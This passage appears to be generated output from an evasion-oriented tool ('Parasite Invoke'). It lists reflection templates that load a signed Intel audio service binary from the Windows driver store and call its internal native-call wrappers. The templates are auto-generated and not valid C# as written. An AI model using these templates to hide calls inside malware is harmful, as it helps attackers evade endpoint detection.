        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { SetMultiPaParameterDelegate _setMultiPaParameterDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyGetMultiPaParameterDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyGetMultiPaParameterDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { GetMultiPaParameterDelegate _getMultiPaParameterDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpQueryDelegate _cpQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpMicArrayQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpMicArrayQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpMicArrayQueryDelegate _cpMicArrayQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpCreateStreamV1Delegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpCreateStreamV1Delegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpCreateStreamV1Delegate _cpCreateStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpCreateStreamV2Delegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpCreateStreamV2Delegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpCreateStreamV2Delegate _cpCreateStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpCreateStreamV3Delegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpCreateStreamV3Delegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpCreateStreamV3Delegate _cpCreateStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpDestroyStreamDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpDestroyStreamDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpDestroyStreamDelegate _cpDestroyStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpStartDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpStartDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpStartDelegate _cpStartDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpStopDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpStopDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpStopDelegate _cpStopDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpGetBufferDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpGetBufferDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpGetBufferDelegate _cpGetBufferDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpEventQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpEventQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpEventQueryDelegate _cpEventQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpFarfieldSupportQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpFarfieldSupportQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpFarfieldSupportQueryDelegate _cpFarfieldSupportQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpAudioFormatQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpAudioFormatQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpAudioFormatQueryDelegate _cpAudioFormatQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpApiVersionQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpApiVersionQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpApiVersionQueryDelegate _cpApiVersionQueryDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaDetectorGetCapsDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaDetectorGetCapsDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaDetectorGetCapsDelegate _acaDetectorGetCapsDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaRegisterNotificationHandleDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaRegisterNotificationHandleDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaRegisterNotificationHandleDelegate _acaRegisterNotificationHandleDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaUnregisterNotificationHandleDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaUnregisterNotificationHandleDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaUnregisterNotificationHandleDelegate _acaUnregisterNotificationHandleDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaStartSoundDetectDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaStartSoundDetectDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaStartSoundDetectDelegate _acaStartSoundDetectDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaStopSoundDetectDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaStopSoundDetectDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaStopSoundDetectDelegate _acaStopSoundDetectDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaSetIpParamDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaSetIpParamDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaSetIpParamDelegate _acaSetIpParamDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaGetIpParamDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaGetIpParamDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaGetIpParamDelegate _acaGetIpPramDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyAcaContextQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyAcaContextQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { AcaContextQueryDelegate _acaContextQueryDelegate });
        ===END SIGNATURE===

Method: SetAcaProxyGetAcaApiVersionDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.AcaProxy.RpcAcaProxy"", true);
        var methodInfo = t.GetMethod(""SetAcaProxyGetAcaApiVersionDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { GetAcaApiVersionDelegate _getApiVersionDelegate });
        ===END SIGNATURE===

Method: SetLogMessageDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Logger.AudioServiceLogger"", true);
        var methodInfo = t.GetMethod(""SetLogMessageDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { LoggerDelegate _loggerDelegate });
        ===END SIGNATURE===

Method: LogWppMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Logger.WppLogger"", true);
        var methodInfo = t.GetMethod(""LogWppMessage"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { string _message });
        ===END SIGNATURE===

Method: IWoVInitSession
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVInitSession"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { UInt32& _sessionID });
        ===END SIGNATURE===

Method: IWoVDestroySession
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVDestroySession"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { uint _sessionID });
        ===END SIGNATURE===

Method: IWoVInit
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVInit"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntelWovSdkComponent _component });
        ===END SIGNATURE===

Method: IWoVReset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVReset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntelWovSdkComponent _component });
        ===END SIGNATURE===

Method: IWoVSetAttribute
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetAttribute"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { IntelWovSdkConfigAttribute _attributeID, IntPtr _value });
        ===END SIGNATURE===

Method: IWoVSetBinAttribute
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetBinAttribute"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { IntelWovSdkConfigBinAttribute _attributeID, IntPtr _blob });
        ===END SIGNATURE===

Method: IWoVSetModel
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetModel"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntPtr _model });
        ===END SIGNATURE===

Method: IWoVSetModelThreshold
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVSetModelThreshold"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, uint _modelIndex, float _threshold });
        ===END SIGNATURE===

Method: IWoVPrepareLpeData
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.IntelWovSdk.IntelWovSdkImport"", true);
        var methodInfo = t.GetMethod(""IWoVPrepareLpeData"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.DataTypes.IntelWovSdkStatus result = (IntelAudioService.DataTypes.IntelWovSdkStatus) methodInfo.Invoke(null, new object[] { uint _sessionID, IntPtr _lpeBuffer, UInt32& _lpeBufferSize });
        ===END SIGNATURE===

Method: GetEndpoints
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.EndpointDeviceManagerMethods"", true);
        var methodInfo = t.GetMethod(""GetEndpoints"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr& _endpointProxyList, UInt32& _endpointProxyCount });
        ===END SIGNATURE===

Method: KsProperty
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.KsPropertyMethods"", true);
        var methodInfo = t.GetMethod(""KsProperty"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _ksInterface, IntPtr _ksProperty, uint _propertySize, IntPtr _propertyData, uint _propertyDataSize, UInt32& _bytesReturned });
        ===END SIGNATURE===

Method: CreateFarfieldDllClientInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""CreateFarfieldDllClientInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.FarfieldClientSafeHandle result = (IntelAudioService.ControlModuleWrapper.FarfieldClientSafeHandle) methodInfo.Invoke(null, new object[] { string _dllName });
        ===END SIGNATURE===

Method: DisposeFarfieldClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""DisposeFarfieldClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _ffClientPtr });
        ===END SIGNATURE===

Method: UpdateWovConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateWovConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdateReferenceWovConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateReferenceWovConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdatePpConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdatePpConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdateDvConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateDvConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: UpdateMicGeoConfiguration
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""UpdateMicGeoConfiguration"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _buffer, ulong _size });
        ===END SIGNATURE===

Method: Verify
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.FarfieldClientMethods"", true);
        var methodInfo = t.GetMethod(""Verify"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt64 result = (System.UInt64) methodInfo.Invoke(null, new object[] { FarfieldClientSafeHandle _ffClientPtr, IntPtr _inputBuffer, ulong _inputBufferSize, IntPtr _outputBuffer, ulong _outputBufferSize, UInt64& _bytesReturned });
        ===END SIGNATURE===

Method: Reset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
